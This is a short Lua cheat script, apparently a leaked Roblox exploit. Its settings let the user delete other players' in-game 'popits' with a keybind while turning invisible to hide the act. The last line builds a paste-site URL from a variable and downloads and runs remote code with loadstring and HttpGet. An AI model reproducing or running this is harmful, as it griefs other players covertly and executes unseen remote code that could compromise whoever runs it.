--[[
    script by Stan#8292 
leaked by thanhtam8765
]]
getgenv().bind = "F" --keybind to delete popits near you
getgenv().invis = false --turns you invis so people cant see you deleting their stuff (resetting will uninvis you)
getgenv().on = true --setting this to false will stop the script
getgenv().IgnoredList = { --ignored people (script won't delete popits from these people)
    "Person1",
    "Person2",
    "Person3"
}
 
local domain = "paste.ee"
loadstring(game:HttpGet("https://"..domain.."/r/WFYpr/0"))()